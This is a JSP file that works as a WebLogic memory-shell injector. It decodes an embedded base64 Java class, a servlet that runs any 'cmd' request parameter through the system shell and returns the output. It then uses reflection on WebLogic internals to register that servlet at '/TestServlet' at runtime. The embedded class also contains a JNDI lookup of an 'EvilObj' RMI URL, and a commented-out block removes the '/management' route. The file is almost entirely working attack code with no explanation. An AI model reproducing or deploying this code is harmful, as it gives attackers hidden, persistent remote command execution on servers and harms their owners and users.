<%@page import="java.lang.reflect.Field"%>
<%@page import="java.lang.reflect.Method"%>
<%@page import="java.util.Map"%>
<%@page import="java.util.Iterator"%>

<%
//((WlsRequestExecutor)currentWorkEntry).connectionHandler.getHttpServer().getServletContextManager().contextTable
byte[] codeClass = java.util.Base64.getDecoder().decode("yv66vgAAADQAugoAJwBmCAA9CwBnAGgIAGkKAGoAawoACQBsCABtCgAJAG4HAG8IAHAIAHEIAHIIAHMKAHQAdQoAdAB2CgB3AHgHAHkKABEAeggAewoAEQB8CgARAH0KABEAfggAfwsAgACBCgCCAIMKAIIAhAoAggCFCwCGAIEIAIcKACYAiAgAiQgAigoAagCLBwCMCgAiAGYIAI0LAI4AjwcAkAcAkQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTFRlc3RTZXJ2bGV0OwEABGluaXQBACAoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEADXNlcnZsZXRDb25maWcBAB1MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEACkV4Y2VwdGlvbnMHAJIBABBnZXRTZXJ2bGV0Q29uZmlnAQAfKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNMaW51eAEAAVoBAAVvc1R5cAEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAA291dAEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEADVN0YWNrTWFwVGFibGUHAG8HAEMHAJMHAHkHAJQBAAVkb0dldAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAOZ2V0U2VydmxldEluZm8BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB2Rlc3Ryb3kBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBAANjdHgBABZMamF2YXgvbmFtaW5nL0NvbnRleHQ7BwCVAQAKU291cmNlRmlsZQEAEFRlc3RTZXJ2bGV0LmphdmEBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQAlTGphdmF4L3NlcnZsZXQvYW5ub3RhdGlvbi9XZWJTZXJ2bGV0OwEABXZhbHVlAQAML1Rlc3RTZXJ2bGV0DAAoACkHAJYMAJcAmAEAB29zLm5hbWUHAJkMAJoAmAwAmwBYAQADd2luDACcAJ0BABBqYXZhL2xhbmcvU3RyaW5nAQACc2gBAAItYwEAB2NtZC5leGUBAAIvYwcAngwAnwCgDAChAKIHAKMMAKQApQEAEWphdmEvdXRpbC9TY2FubmVyDAAoAKYBAAJcYQwApwCoDACpAKoMAKsAWAEAAAcArAwArQCuBwCvDACwALEMALIAKQwAswApBwC0AQAMdGVzdCBzZXJ2bGV0DAA3AFIBAChjb20uc3VuLmpuZGkucm1pLm9iamVjdC50cnVzdFVSTENvZGViYXNlAQAEdHJ1ZQwAtQC2AQAbamF2YXgvbmFtaW5nL0luaXRpYWxDb250ZXh0AQAccm1pOi8vbG9jYWxob3N0OjEwOTkvRXZpbE9iagcAtwwAuAC5AQALVGVzdFNlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAC3NldFByb3BlcnR5AQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABRqYXZheC9uYW1pbmcvQ29udGV4dAEABmxvb2t1cAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7ACEAJgAnAAAAAAAIAAEAKAApAAEAKgAAAC8AAQABAAAABSq3AAGxAAAAAgArAAAABgABAAAADgAsAAAADAABAAAABQAtAC4AAAABAC8AMAACACoAAAA1AAAAAgAAAAGxAAAAAgArAAAABgABAAAAEgAsAAAAFgACAAAAAQAtAC4AAAAAAAEAMQAyAAEAMwAAAAQAAQA0AAEANQA2AAEAKgAAACwAAQABAAAAAgGwAAAAAgArAAAABgABAAAAFQAsAAAADAABAAAAAgAtAC4AAAABADcAOAACACoAAAGKAAQACwAAAKErEgK5AAMCAE4ENgQSBLgABToFGQXGABMZBbYABhIHtgAImQAGAzYEFQSZABgGvQAJWQMSClNZBBILU1kFLVOnABUGvQAJWQMSDFNZBBINU1kFLVM6BrgADhkGtgAPtgAQOge7ABFZGQe3ABISE7YAFDoIGQi2ABWZAAsZCLYAFqcABRIXOgksuQAYAQA6ChkKGQm2ABkZCrYAGhkKtgAbsQAAAAMAKwAAADoADgAAABkACQAaAAwAGwATABwAJQAdACgAHwBWACAAYwAhAHMAIgCHACMAjwAkAJYAJQCbACYAoAAnACwAAABwAAsAAAChAC0ALgAAAAAAoQA5ADoAAQAAAKEAOwA8AAIACQCYAD0APgADAAwAlQA/AEAABAATAI4AQQA+AAUAVgBLAEIAQwAGAGMAPgBEAEUABwBzAC4ARgBHAAgAhwAaAEgAPgAJAI8AEgBJAEoACgBLAAAAIQAF/gAoBwBMAQcATBlRBwBN/gAuBwBNBwBOBwBPQQcATAAzAAAABgACADQAUAABAFEAUgACACoAAABYAAMAAwAAABIsuQAcAQASHbYAGSorLLYAHrEAAAACACsAAAAOAAMAAAArAAsALAARAC0ALAAAACAAAwAAABIALQAuAAAAAAASAFMAVAABAAAAEgBVAFYAAgAzAAAABgACADQAUAABAFcAWAABACoAAAAsAAEAAQAAAAIBsAAAAAIAKwAAAAYAAQAAADAALAAAAAwAAQAAAAIALQAuAAAAAQBZACkAAQAqAAAAKwAAAAEAAAABsQAAAAIAKwAAAAYAAQAAADQALAAAAAwAAQAAAAEALQAuAAAACQBaAFsAAgAqAAAAWgACAAIAAAAaEh8SILgAIVe7ACJZtwAjTCsSJLkAJQIAV7EAAAACACsAAAASAAQAAAA4AAgAOQAQADoAGQA7ACwAAAAWAAIAAAAaAFwAQwAAABAACgBdAF4AAQAzAAAABAABAF8AAgBgAAAAAgBhAGIAAAAOAAEAYwABAGRbAAFzAGU=");
	ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
	java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
	define.setAccessible(true);
	//Class evilFilterClass  = (Class)define.invoke(cl,codeClass,0,codeClass.length);
	
	
Class<?> executeThread = Class.forName("weblogic.work.ExecuteThread");
            java.lang.reflect.Method m = executeThread.getDeclaredMethod("getCurrentWork");
            Object currentWork = m.invoke(Thread.currentThread());

			
            java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
            connectionHandlerF.setAccessible(true);
            Object obj = connectionHandlerF.get(currentWork);

            java.lang.reflect.Field requestF = obj.getClass().getDeclaredField("request");
            requestF.setAccessible(true);
            obj = requestF.get(obj);

            java.lang.reflect.Field contextF = obj.getClass().getDeclaredField("context");
            contextF.setAccessible(true);
            Object context = contextF.get(obj);
			
			Method registerServletM = (Method)context.getClass().getDeclaredMethod("registerServlet",String.class,String.class,String.class);
			registerServletM.setAccessible(true);
			registerServletM.invoke(context,"TestServlet","/TestServlet","TestServlet");
			
			
			
			
			/*
            java.lang.reflect.Field connectionHandlerF = currentWork.getClass().getDeclaredField("connectionHandler");
            connectionHandlerF.setAccessible(true);
            weblogic.servlet.internal.HttpConnectionHandler connectionHandler = (weblogic.servlet.internal.HttpConnectionHandler)connectionHandlerF.get(currentWork);
			Object scm = connectionHandler.getHttpServer().getServletContextManager();
			Field f = scm.getClass().getDeclaredField("contextTable");
			f.setAccessible(true);
			weblogic.servlet.utils.ServletMapping servletmapping = (weblogic.servlet.utils.ServletMapping)f.get(scm);
			//servletmapping.removePattern("/management");
			Field mmf = servletmapping.getClass().getSuperclass().getDeclaredField("matchMap");
			mmf.setAccessible(true);
			weblogic.utils.collections.MatchMap matchMap = (weblogic.utils.collections.MatchMap)mmf.get(servletmapping);
			matchMap.remove("/management");
			
			
*/


%>